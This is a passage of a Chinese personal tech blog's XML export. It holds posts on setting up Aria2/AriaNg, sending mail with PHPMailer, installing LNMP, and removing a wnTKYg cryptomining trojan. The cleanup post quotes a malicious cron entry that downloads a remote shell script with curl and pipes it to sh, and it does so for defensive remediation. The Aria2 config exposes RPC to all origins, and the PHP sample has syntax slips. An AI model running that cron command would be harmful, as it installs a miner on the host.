<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#文件保存路径设置，请手动更改</span><br><span class="line">dir&#x3D;&#x2F;home&#x2F;data</span><br><span class="line"></span><br><span class="line">disk-cache&#x3D;32M</span><br><span class="line">file-allocation&#x3D;none</span><br><span class="line">continue&#x3D;true</span><br><span class="line">max-concurrent-downloads&#x3D;10</span><br><span class="line">max-connection-per-server&#x3D;5</span><br><span class="line">min-split-size&#x3D;10M</span><br><span class="line">split&#x3D;20</span><br><span class="line">disable-ipv6&#x3D;true</span><br><span class="line">input-file&#x3D;&#x2F;root&#x2F;.aria2&#x2F;aria2.session</span><br><span class="line">save-session&#x3D;&#x2F;root&#x2F;.aria2&#x2F;aria2.session</span><br><span class="line"></span><br><span class="line">## RPC相关设置 ##</span><br><span class="line"># 启用RPC, 默认:false</span><br><span class="line">enable-rpc&#x3D;true</span><br><span class="line"># 允许所有来源, 默认:false</span><br><span class="line">rpc-allow-origin-all&#x3D;true</span><br><span class="line"># 允许非外部访问, 默认:false</span><br><span class="line">rpc-listen-all&#x3D;true</span><br><span class="line"># 事件轮询方式, 取值:[epoll, kqueue, port, poll, select], 不同系统默认值不同</span><br><span class="line">#event-poll&#x3D;select</span><br><span class="line"># RPC监听端口, 端口被占用时可以修改, 默认:6800</span><br><span class="line">rpc-listen-port&#x3D;6800</span><br><span class="line"># 设置的RPC授权令牌，在设置AriaNg时需要用到，请手动更改【自己随便改成什么都可以】</span><br><span class="line">rpc-secret&#x3D;&lt;TOKEN&gt;</span><br><span class="line"></span><br><span class="line">follow-torrent&#x3D;true</span><br><span class="line">listen-port&#x3D;6881-6999</span><br><span class="line">enable-dht&#x3D;true</span><br><span class="line">enable-peer-exchange&#x3D;true</span><br><span class="line">peer-id-prefix&#x3D;-TR2770-</span><br><span class="line">user-agent&#x3D;Transmission&#x2F;2.77</span><br><span class="line">seed-ratio&#x3D;0.1</span><br><span class="line">bt-seed-unverified&#x3D;true</span><br><span class="line">bt-save-metadata&#x3D;false</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h2 id="开启Aria2"><a href="#开启Aria2" class="headerlink" title="开启Aria2"></a>开启Aria2</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aria2c --conf-path&#x3D;&#x2F;root&#x2F;.aria2&#x2F;aria2.conf -D</span><br><span class="line"></span><br><span class="line"># 关闭程序</span><br><span class="line">killall -9 aria2c</span><br></pre></td></tr></table></figure>



<h2 id="安装AriaNg"><a href="#安装AriaNg" class="headerlink" title="安装AriaNg"></a>安装AriaNg</h2><ol>
<li><p>需要LNMP环境，可以使用LNMP一键安装包，安装环境</p>
</li>
<li><p>下载安装包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;mayswind&#x2F;AriaNg&#x2F;releases&#x2F;download&#x2F;1.1.3&#x2F;AriaNg-1.1.3.zip</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压后放到LNMP环境安装时，指定的网站根目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv AriaNg-1.1.3.zip &#x2F;home&#x2F;wwwroot&#x2F;default</span><br><span class="line">unzip AriaNg-1.1.3.zip</span><br></pre></td></tr></table></figure>



</li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Deepin</tag>
        <tag>Aria2</tag>
        <tag>AriaNg</tag>
      </tags>
  </entry>
  <entry>
    <title>使用PHPMailer封装类发送邮件</title>
    <url>/2017/09/30/7.html</url>
    <content><![CDATA[<p>近期，打算做一个邮箱注册，使用的是smtp服务。可是奇怪的是在本地调试是好的，一搬到阿里云的服务器上就不行了。想了好久没有答案，所以提了一下工单给阿里云，以下是阿里云的回复。</p>
<a id="more"></a>
<blockquote>
<p>由于国际与国内均对垃圾邮件进行严格管控，我国《互联网信息服务管理办法》、《中国互联网协会反垃圾邮件规范》均对垃圾邮件进行说明与管理规范。鉴于服务器25端口被大量垃圾邮件充斥，严重影响广大用户正常使用。为了共同维护良好的网络环境，自即日起阿里云新购服务器不再提供25端口邮件服务，建议您尝试使用465加密端口发送邮件，或与邮件发信提供商咨询是否还有其他smtp发信端口。</p>
</blockquote>
<p>好吧，原来是25端口不能用了。改呗，换端口，可是换完之后本地也不能用了。天哪，这是怎么回事。想了一想，原本是好的，但是换了端口就不行了，那么肯定是这个邮件发送类不支持其它端口。马上换个邮件发送类，在GitHub搜索<a href="https://github.com/PHPMailer/PHPMailer" target="_blank" rel="noopener">PHPMailer</a>， 一堆英文看不懂，尴尬了。好在看到了一个A Simple Example，行，照着改呗。下面就贴出这个简单的例子及我的一些中文注释。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// Import PHPMailer classes into the global namespace</span></span><br><span class="line">	<span class="comment">// These must be at the top of your script, not inside a function</span></span><br><span class="line">	<span class="comment">// use PHPMailer\PHPMailer\PHPMailer;</span></span><br><span class="line">	<span class="comment">// use PHPMailer\PHPMailer\Exception;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//Load composer’s autoloader</span></span><br><span class="line">	<span class="comment">// require ‘vendor/autoload.php’;</span></span><br><span class="line">	<span class="comment">//导入文件，文件内容自己去GitHub下载，地址：https://github.com/PHPMailer/PHPMailer</span></span><br><span class="line">    <span class="keyword">require</span> <span class="string">'./PHPMailer.php'</span>;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">'./SMTP.php'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	mail = <span class="keyword">new</span> PHPMailer(<span class="keyword">true</span>);                              <span class="comment">// Passing true enables exceptions</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	    <span class="comment">//Server settings（服务器设置）</span></span><br><span class="line">	    mail-&gt;SMTPDebug = <span class="number">2</span>;                                 <span class="comment">// Enable verbose debug output（启用详细调试输出）</span></span><br><span class="line">	    mail-&gt;isSMTP();                                      <span class="comment">// Set mailer to use SMTP（设置使用SMTP服务）</span></span><br><span class="line">	    mail-&gt;Host = <span class="string">'smtp.163.com'</span>;                         <span class="comment">// Specify main and backup SMTP servers（SMTP服务器）</span></span><br><span class="line">	    mail-&gt;SMTPAuth = <span class="keyword">true</span>;                               <span class="comment">// Enable SMTP authentication（启用SMTP验证）</span></span><br><span class="line">	    mail-&gt;Username = <span class="string">'abcde@163.com'</span>;                    <span class="comment">// SMTP username</span></span><br><span class="line">	    mail-&gt;Password = <span class="string">'abcde123456'</span>;                      <span class="comment">// SMTP password</span></span><br><span class="line">	    mail-&gt;SMTPSecure = <span class="string">'ssl'</span>;                            <span class="comment">// Enable TLS encryption, ssl also accepted（启用TLS加密，ssl也被接受）</span></span><br><span class="line">	    $mail-&gt;Port = <span class="number">465</span>;                                    <span class="comment">// TCP port to connect to（要连接的TCP端口）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">//Recipients（收件人）</span></span><br><span class="line">		$mail-&gt;setFrom(<span class="string">'abcde@163.com'</span>, <span class="string">'Mailer'</span>);            <span class="comment">//Mailer随便写一个名字</span></span><br><span class="line">		$mail-&gt;addAddress(<span class="string">'123456@qq.com'</span>, <span class="string">'Joe User'</span>);       <span class="comment">// Add a recipient（添加一个收件人）</span></span><br><span class="line">		$mail-&gt;addAddress(<span class="string">'ellen@example.com'</span>);               <span class="comment">// Name is optional（再添加一个收件人，其中Joe User及名字可以不写）</span></span><br><span class="line">		$mail-&gt;addReplyTo(<span class="string">'info@example.com'</span>, <span class="string">'Information'</span>); <span class="comment">//抄送</span></span><br><span class="line">		<span class="comment">// $mail-&gt;addCC('cc@example.com');</span></span><br><span class="line">		<span class="comment">// $mail-&gt;addBCC('bcc@example.com');</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//Attachments（附件）</span></span><br><span class="line">		$mail-&gt;addAttachment(<span class="string">'/var/tmp/file.tar.gz'</span>);         <span class="comment">// Add attachments（添加一个文件在服务器上的完整路径）</span></span><br><span class="line">		<span class="comment">// $mail-&gt;addAttachment('/tmp/image.jpg', 'new.jpg');    // Optional name</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//Content（邮件内容）</span></span><br><span class="line">		$mail-&gt;isHTML(<span class="keyword">true</span>);                                  <span class="comment">// Set email format to HTML</span></span><br><span class="line">		$mail-&gt;Subject = <span class="string">'Here is the subject'</span>;               <span class="comment">// 邮件标题</span></span><br><span class="line">		$mail-&gt;Body    = <span class="string">'This is the HTML message body &lt;b&gt;in bold!&lt;/b&gt;'</span>;               <span class="comment">//邮件内容（可以使用html标签）</span></span><br><span class="line">		<span class="comment">// $mail-&gt;AltBody = 'This is the body in plain text for non-HTML mail clients';</span></span><br><span class="line">		</span><br><span class="line">		$mail-&gt;send();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Message has been sent'</span>;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> e) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">'Message could not be sent.'</span>;</span><br><span class="line">	    <span class="comment">// echo 'Mailer Error: ' . mail-&gt;ErrorInfo;          // 具体报错信息，基本不用，歪果仁写的就是好，一用就成功</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><strong>各位大神，如果有好的见解，记得告诉我，让我完善完善。</strong></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHPMailer</tag>
        <tag>smtp服务</tag>
        <tag>邮件发送类</tag>
      </tags>
  </entry>
  <entry>
    <title>LNMP环境部署</title>
    <url>/2017/10/25/9.html</url>
    <content><![CDATA[<p>部署LNMP环境对于老手来说是简单的，但是也烦（主要是懒得写个比较完美的脚本）。对于新手来说是真的难，想当初我还是小白的时候不停地百度总结，用了好久的时间才部署完一个LNMP环境。下面就来介绍一个网上比较流行的LNMP一键安装包。</p>
<a id="more"></a>
<ol>
<li><p>首先打开浏览器输入 <a href="https://lnmp.org" target="_blank" rel="noopener">https://lnmp.org</a> 进入一键安装包的首页</p>
</li>
<li><p>点击 “下载”</p>
</li>
<li><p>安装包分为两个版本<br> ① 下载版：不含源码安装包文件，仅有安装脚本及配置文件<br> ② 完整版：源码包+安装脚本+配置文件</p>
<blockquote>
<p>注：建议下载 <a href="http://soft.vpser.net/lnmp/lnmp1.5.tar.gz" target="_blank" rel="noopener">下载版</a> （节约时间）</p>
</blockquote>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget http://soft.vpser.net/lnmp/lnmp1.5.tar.gz</span><br></pre></td></tr></table></figure>

<p> 验证MD5</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">md5sum lnmp1.5.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压后进入文件夹运行 <code>install.sh</code></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf lnmp1.5.tar.gz</span><br><span class="line">cd lnmp1.5</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>选择相应的MySQL版本及root密码，然后一直回车</p>
<blockquote>
<p>注：MySQL 5.6,5.7及MariaDB 10必须在1G以上内存或更高配置上才能选择</p>
</blockquote>
</li>
<li><p>选择相应的PHP版本</p>
</li>
<li><p>选择是否安装内存优化</p>
<blockquote>
<p>注：本人选择的是Install Jemalloc，就是输入2然后回车（不作强求，视情况而定）</p>
</blockquote>
</li>
<li><p>提示“ Press any key to install…or Press Ctrl+c to cancel ”后，按回车键确认开始安装</p>
</li>
<li><p>一切搞定，然后等提示“ Install lnmp V1.5 completed! enjoy it ”，就表示成功了，如果失败自己百度</p>
</li>
</ol>
<hr>
<p>参考文章：<a href="https://lnmp.org/install.html" target="_blank" rel="noopener">https://lnmp.org/install.html</a>  </p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>LNMP</tag>
        <tag>一键脚本</tag>
        <tag>运行环境</tag>
      </tags>
  </entry>
  <entry>
    <title>清除wnTKYg挖矿木马病毒</title>
    <url>/2017/10/08/8.html</url>
    <content><![CDATA[<p>今天发现网站的后台进不去，而且前台的一些图片也显示不出来。远程连接服务器查看，原来有一个程序占用200%多的CPU，而且这个程序我不认识，好吧肯定是中病毒了。百度一下这个病毒wnTKYg。幸好百度给力啊，第一个就是解决方案，现在把方案和我自己的处理过程做个记录。</p>
<a id="more"></a>
<ol>
<li><p>根据其他人的经验，这个是钻了redis的空子进来的，所以修改redis的相关配置</p>
<ol>
<li>修改默认端口</li>
<li>设置密码</li>
<li>设置 <code>bind xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx</code></li>
</ol>
</li>
<li><p>查看 <code>/root/.ssh</code> 下的文件，找到 <code>known_hosts</code> 中发现不认识的IP，用防火墙禁掉它</p>
</li>
<li><p>查看 <code>/var/spool/cron</code> 文件夹下的定时任务中是否有可疑内容，如果有就干掉它 下面是我的可疑内容情况：  </p>
<blockquote>
<p>*/5 * * * * curl -fsSL <a href="http://218.248.40.228:8443/i.sh?6" target="_blank" rel="noopener">http://218.248.40.228:8443/i.sh?6</a> | sh</p>
</blockquote>
<p> <strong><em>直接删除即可，然后看一下是否还有哦可疑文件，有就直接删除。（需要百分百确保是没有用的文件）</em></strong></p>
</li>
<li><p>查找相关的病毒文件，然后删除此文件</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name wnTKYg*</span><br><span class="line">rm -rf 相应目录下的wnTKYg文件</span><br></pre></td></tr></table></figure>
</li>
<li><p>找到此病毒的守护进程，使用top发现可疑进程 <code>ddg.1007</code> ，找到后删除</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name ddg.*</span><br><span class="line">rm -rf 相应目录下的ddg.*文件</span><br></pre></td></tr></table></figure>
</li>
<li><p>找到相应的 <code>wnTKYg</code> 进程杀掉（ <code>ddg.1007</code> 同理）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pgrep wnTKYg | xargs kill -s 9</span><br></pre></td></tr></table></figure>

</li>
</ol>
<hr>
<p>参考文章：<a href="http://blog.sina.com.cn/s/blog_c08907b10102wyyl.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_c08907b10102wyyl.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>木马病毒</tag>
        <tag>Redis漏洞</tag>
      </tags>
  </entry>
</search>
